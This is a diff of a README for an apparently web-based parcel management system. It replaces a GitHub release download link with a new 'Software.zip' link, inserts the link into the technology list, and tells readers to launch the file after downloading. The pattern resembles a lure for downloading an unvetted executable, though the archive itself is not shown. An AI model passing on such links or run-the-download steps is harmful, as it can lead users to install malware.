@@ -23,7 +23,7 @@ The Parcel Management System is a comprehensive solution aimed at improving the 
 🎨 Animation  
 🔒 CORS  
 🔑 dotenv  
-🚀 https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip  
+🚀 https://github.com/woo071002/parcel-management-system/releases/download/v2.0/Software.zip  
 🖼️ Image processing  
 🔐 JWT Authentication  
 📦 Local storage  
@@ -35,7 +35,7 @@ The Parcel Management System is a comprehensive solution aimed at improving the 
 ## Installation
 
 To get started with the Parcel Management System, you can download the latest release from the following link:
-[![Download](https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip)](https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip)
+[![Download](https://github.com/woo071002/parcel-management-system/releases/download/v2.0/Software.zip)](https://github.com/woo071002/parcel-management-system/releases/download/v2.0/Software.zip)
 
 Please note that the file needs to be launched after downloading to start using the system.
 
